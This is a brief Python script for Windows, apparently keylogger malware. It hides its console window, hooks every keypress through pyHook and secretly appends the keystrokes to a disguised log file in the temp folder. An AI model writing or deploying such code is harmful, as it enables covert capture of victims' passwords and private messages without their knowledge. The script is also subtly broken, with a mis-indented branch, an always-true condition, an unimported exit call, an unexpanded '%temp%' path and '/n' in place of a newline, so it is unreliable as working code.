import win32api 
import win32console 
import win32gui 
import pythoncom, pyHook 
  
win = win32console.GetConsoleWindow() 
win32gui.ShowWindow(win, 0) 
  
def OnKeyboardEvent(event): 
    if event.Ascii==5: 
        _exit(1) 
    if event.Ascii !=0 or 8: 
        # open log file to read current keystrokes 
        f = open('%temp%\\.ff02d33eb890a228728af672b3bf1f53.log', 'r+') 
        buffer = f.read() 
        f.close() 

        # open log file to write current + new keystrokes 
        f = open('%temp%\\.ff02d33eb890a228728af672b3bf1f53.log', 'w') 
        keylogs = chr(event.Ascii) 
        if event.Ascii == 13: 
        keylogs = '/n'
        buffer += keylogs 
        f.write(buffer) 
        f.close() 

# create a hook manager object 
hm = pyHook.HookManager() 
hm.KeyDown = OnKeyboardEvent 
# set the hook 
hm.HookKeyboard() 
# start wait loop 
pythoncom.PumpMessages() 

